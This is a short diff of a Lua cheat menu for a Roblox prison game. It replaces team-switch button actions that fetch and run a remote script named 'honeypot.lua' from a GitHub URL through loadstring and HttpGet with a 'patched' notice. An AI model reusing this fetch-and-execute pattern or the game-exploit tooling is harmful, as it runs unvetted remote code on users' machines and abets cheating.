@@ -2332,7 +2332,7 @@ MainTab:CreateSection("Team Management")
 MainTab:CreateButton({
     Name = "Switch to Inmates",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
+        Notify("Sorry, this command is patched!")
     end,
 })
 
@@ -2340,9 +2340,9 @@ MainTab:CreateButton({
     Name = "Switch to Guards",
     Callback = function()
         if #Teams.Guards:GetPlayers() > 7 then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
+            Notify("Sorry, this command is patched!")
         else
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
+            Notify("Sorry, this command is patched!")
         end
     end,
 })
@@ -2350,7 +2350,7 @@ MainTab:CreateButton({
 MainTab:CreateButton({
     Name = "Switch to Criminals",
     Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/S-PScripts/kohlslite/refs/heads/main/lsafoadsgo/honeypot.lua"))()
+        Notify("Sorry, this command is patched!")
     end,
 })
 
